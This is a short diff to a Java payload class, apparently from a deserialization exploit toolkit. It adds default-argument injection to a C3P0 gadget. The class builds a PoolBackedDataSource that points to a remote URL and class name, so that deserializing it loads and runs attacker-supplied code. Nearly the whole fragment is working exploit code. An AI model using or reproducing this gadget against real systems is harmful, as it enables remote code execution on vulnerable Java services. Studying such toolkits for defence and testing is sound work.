@@ -34,14 +34,23 @@ import javax.sql.PooledConnection;
  */
 public class C3P0 implements Payload {
 
+    private String[] args;
+
     @Override
     public Object getPayload(String[] args) throws Exception {
+        if (this.args != null)
+            args = this.args;
         String url = args[0];
         String className = args[1];
 
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
         return b;
+    }
+
+    @Override
+    public void injectDefaultArgs(String[] args) {
+        this.args = args;
     }
 
 
